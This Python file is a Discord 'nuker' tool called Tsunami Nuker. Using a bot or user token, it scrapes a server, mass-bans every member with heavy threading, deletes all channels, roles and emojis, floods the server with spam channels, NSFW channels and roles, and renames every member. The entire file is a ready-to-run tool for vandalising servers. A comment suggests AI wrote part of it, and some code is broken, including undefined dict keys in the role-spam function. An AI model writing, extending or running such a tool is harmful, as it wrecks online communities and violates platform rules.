import discord
import requests
from discord.ext import commands
from requests_futures.sessions import FuturesSession
from time import sleep
from threading import Thread
from os import _exit, system, remove

# linux users change cls to clear 


system('cls & mode 120,20 & title Tsunami Nuker - Loading')
token = input('\x1b[37;5;56m[\x1b[34;5;56mTOKEN\x1b[37;5;56m]:  \x1b[0m')
if not token:
    print('Error: token not found')
    _exit(1) 
system('cls')
session = FuturesSession()

def check():
    print('Validating Discord token...')

    # Try as bot token first
    r = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'Bot {token}'})
    print(f'Bot token attempt: Status {r.status_code}')
    if r.status_code == 200:
        print('Valid bot token detected')
        return "bot"

    # Try as user token
    r = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'{token}'})
    print(f'User token attempt: Status {r.status_code}')
    if r.status_code == 200:
        print('Valid user token detected')
        return "user"

    # If both fail, show more details
    print(f'Error: Invalid Discord token (Bot: {r.status_code})')
    print('Please check that your token is correct')
    _exit(1)
    
tsu_token = check() 
intents = discord.Intents.all()
intents.members = True

if tsu_token == "user":
    headers = {'Authorization': f'{token}'}
    client = discord.Client(intents=intents)
elif tsu_token == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix='tsu', case_insensitive=True, intents=intents)
    
class Tsunami:
    def __init__(self):
        self.blue = '\x1b[34;5;56m' 
        self.white = '\x1b[37;5;56m'
        self.reset = '\033[37m'
        self.red = '\x1b[31;5;56m'
        self.cyan = '\x1b[36;5;56m'

    def banall_fast(self, guild, user):
        payload = {'reason': 'Tsunami Nuker 2021'}
        
        try:
            # Use only the fastest endpoint
            r = requests.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{user.strip()}', 
                           headers=headers, json=payload, timeout=2)
            if r.status_code in [200, 201, 204]:
                print(f'{self.white}[{self.blue}BANNED {user.strip()}{self.white}]{self.reset}')
            elif r.status_code == 429:
                print(f'{self.white}[{self.blue}RATE LIMITED {user.strip()}{self.white}]{self.reset}')
            else:
                print(f'{self.white}[{self.red}FAILED {user.strip()}{self.white}]{self.reset}')
        except:
            print(f'{self.white}[{self.red}FAILED {user.strip()}{self.white}]{self.reset}')    

    def deletechannels(self, guild, channel):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }        
            r = session.delete(f'https://canary.discordapp.com/api/v9/channels/{str(channel)}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {channel.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {channel.strip()}{self.white}]{self.reset}')        

    def deletechannels2(self, guild, channel):
        while True:
            payload = {
                'reason': 'Tsunami Nuker 2021'
            }        
            r = session.delete(f'https://discord.com/api/v10/channels/{channel}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {channel.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {channel.strip()}{self.white}]{self.reset}')                  

    def deleteroles(self, guild, role):
        while True:
            payload = {
                'reason': 'TSUNAMI NUKER 2021'
            }
            r = session.delete(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/roles/{str(role)}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {role.strip()}{self.white}]{self.reset}') 

    def deleteroles2(self, guild, role):
        while True:
            payload = {
                'reason': 'TSUNAMI NUKER 2021'
            }
            r = session.delete(f'https://discord.com/api/v10/guilds/{guild}/roles/{role}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {role.strip()}{self.white}]{self.reset}') 

    def deleteemojis(self, guild, emoji):
        while True:
            payload = {
                'reason': 'TSUNAMI NUKER 2021'
            }
            r = session.delete(f'https://discord.com/api/v10/guilds/{guild}/emojis/{emoji}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {emoji.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO DELETE {emoji.strip()}{self.white}]{self.reset}') 

    def nicknameall(self, guild, user, name):
        while True:
            payload = {
                'nick': name
            }
            r = session.patch(f'https://discord.com/api/v10/guilds/{guild}/members/{user}', headers=headers, json=payload).result()
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY NICKNAMED {user.strip()}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO NICKNAME {user.strip()}{self.white}]{self.reset}') 

    def spamchannels(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 0
            }
            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}') 

    def spamchannels2(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 0
            }
            r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}') 

    def spamnsfw(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 0,
                'nsfw': True
            }
            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}') 

    def spamvcchannels(self, guild, name):
        while True:
            payload = {
                'name': name,
                'type': 2
            }
            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}')      

    def spamroles(self, guild, name):
        while True:
            payload = {
                'name': name,
                'color': 0xFF0000,
                hoist: True,
                mentionable: True
            }
            r = requests.post(f'https://canary.discordapp.com/api/v10/guilds/{guild}/roles', headers=headers, json=payload)
            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                break
            elif r.status_code == 429:
                retry = r.json()['retry_after']
                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
                break
            else:
                print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}')                       

    async def scrape(self):  
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        await client.wait_until_ready()
        target = client.get_guild(int(guild))
        members = await target.chunk()

        try:
            remove('members.txt')
            remove('channels.txt')
            remove('roles.txt')
            remove('emojis.txt')
        except:
            pass

        membercount = 0
        with open('members.tsu', 'a') as m:
            for member in members:
                m.write(str(member.id) + '\n')
                membercount += 1
            print(f'{self.white}[{self.blue}SCRAPED {membercount} USERS{self.white}]{self.reset}')   
            m.close()

        channelcount = 0  
        with open('channels.tsu', 'a') as c:
            for channel in target.channels:
                 c.write(str(channel.id) + '\n')
                 channelcount += 1
            print(f'{self.white}[{self.blue}SCRAPED {channelcount} CHANNELS{self.white}]{self.reset}')
            c.close()

        rolecount = 0
        with open('roles.tsu', 'a') as r:
            for role in target.roles:
                r.write(str(role.id) + '\n')
                rolecount += 1
            print(f'{self.white}[{self.blue}SCRAPED {rolecount} ROLES{self.white}]{self.reset}')   
            r.close()  

        emojicount = 0
        with open('emojis.tsu', 'a') as e:
            for emoji in target.emojis:
                e.write(str(emoji.id) + '\n')
                emojicount += 1
            print(f'{self.white}[{self.blue}SCRAPED {emojicount} EMOJIS{self.white}]{self.reset}')   
            e.close()  

    async def tsuban_optimized(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        
        try:
            with open('members.tsu', 'r') as members:
                member_list = [line.strip() for line in members if line.strip()]
            
            # Maximize concurrency for speed
            from concurrent.futures import ThreadPoolExecutor
            import time
            
            batch_size = 100  # Larger batches
            for i in range(0, len(member_list), batch_size):
                batch = member_list[i:i+batch_size]
                
                with ThreadPoolExecutor(max_workers=50) as executor:  # More workers
                    for member in batch:
                        executor.submit(self.banall_fast, guild, member)
                
                # Minimal delay between batches
                time.sleep(0.1)
                # ai made thi... literally
        except FileNotFoundError:
            print(f'{self.white}[{self.red}MEMBERS FILE NOT FOUND{self.white}]{self.reset}') 
            
    async def tsudc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        channels = open('channels.tsu') 
        for channel in channels:
            Thread(target=self.deletechannels, args=(guild, channel)).start()
        channels.close()      

    async def tsudc2(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        channels = open('channels.tsu') 
        for channel in channels:
            Thread(target=self.deletechannels2, args=(guild, channel)).start()
        channels.close()

    async def tsudr(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        roles = open('roles.tsu') 
        for role in roles:
            Thread(target=self.deleteroles, args=(guild, role)).start()
        roles.close()           

    async def tsudr2(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        roles = open('roles.tsu') 
        for role in roles:
            Thread(target=self.deleteroles2, args=(guild, role)).start()
        roles.close()               

    async def tsude(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        emojis = open('emojis.tsu') 
        for emoji in emojis:
            Thread(target=self.deleteemojis, args=(guild, emoji)).start()
        emojis.close()     

    async def tsucc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamchannels, args=(guild, name)).start()

    async def tsucc2(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamchannels2, args=(guild, name)).start()        

    async def tsusvc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamvcchannels, args=(guild, name)).start()

    async def tsusnc(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}CHANNEL NAME{self.white}]: {self.reset}')
        amount = input(f'{self.white}[{self.blue}AMOUNT{self.white}]: {self.reset}')
        for i in range(int(amount)):
            Thread(target=self.spamnsfw, args=(guild, name)).start()         

    async def tsunick(self):        
        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
        name = input(f'{self.white}[{self.blue}NAME{self.white}]: {self.reset}')
        members = open('members.tsu')
        for member in members:
            Thread(target=self.nicknameall, args=(guild, member, name)).start()
        members.close()    
        
    async def tsuxlux(self):
        system('cls & mode 120,20 & title Tsunami Nuker')
        print(f'''
                     {self.blue}[{self.white}tsu#1800 | hoodrich#1800{self.blue}]{self.reset}
        ''')
        print(f'''
                        {self.blue}╔╦╗╔═╗╦ ╦╔╗╔╔═╗╔╦╗╦  
                         {self.cyan}║ ╚═╗║ ║║║║╠═╣║║║║  
                         {self.white}╩ ╚═╝╚═╝╝╚╝╩ ╩╩ ╩╩  
  {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                       {self.blue}Logged In As {client.user.name}           
  {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          {self.blue}╔═══════════════════════════════════════════════════╗
          {self.blue}║ {self.white}1: Banall - Bans All Scraped Users                {self.blue}║
          {self.blue}║ {self.white}2: Channel - Deletes All Scraped Channels         {self.blue}║
          {self.blue}║ {self.white}3: Roles - Deletes All Scraped Roles              {self.blue}║
          {self.blue}║ {self.white}4: Emojis - Deletes All Scraped Emojis            {self.blue}║
          {self.blue}║ {self.white}5: Spam Channels - Spams Channels                 {self.blue}║
          {self.blue}║ {self.white}6: Spam Voice Channels - Spams Voice Channels     {self.blue}║ 
          {self.blue}║ {self.white}7: Spam NSFW Channels - Spams NSFW Channels       {self.blue}║ 
          {self.blue}║ {self.white}8: Nickname - Nicknames All Scraped Users         {self.blue}║
          {self.blue}║ {self.white}9: Scrape - Scrapes The Guild                     {self.blue}║ 
          {self.blue}╚═══════════════════════════════════════════════════╝
  {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{self.reset}''')  
        option = input('\x1b[37;5;56m[\x1b[34;5;56mOPTION\x1b[37;5;56m]:  \x1b[0m')
        if option == '1':
            await self.tsuban_optimized()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '2':
            await self.tsudc()
            await self.tsudc2()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '3':
            await self.tsudr()
            await self.tsudr2()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '4':
            await self.tsude()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '5':
            await self.tsucc()
            await self.tsucc2()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '6':
            await self.tsusvc()
            sleep(1.5)
            system('cls')
            await self.tsuxlux() 
        elif option == '7':
            await self.tsusnc()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '8':
            await self.tsunick()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()
        elif option == '9':
            await self.scrape()
            sleep(1.5)
            system('cls')
            await self.tsuxlux()

    def TSURUN(self):
        if tsu_token == "user":
            try:
                client.run(token)
            except Exception as e:     
                print(f'{self.white}[{self.red}CONNECTION ERROR: {str(e)}{self.white}]{self.reset}') 
        elif tsu_token == "bot":
            try:
                client.run(token)
            except Exception as e:   
                print(f'{self.white}[{self.red}CONNECTION ERROR: {str(e)}{self.white}]{self.reset}') 
        else:
            _exit(0)                  

    @client.event
    async def on_connect():
        await Tsunami().tsuxlux()

if __name__ == "__main__":
    Tsunami().TSURUN()
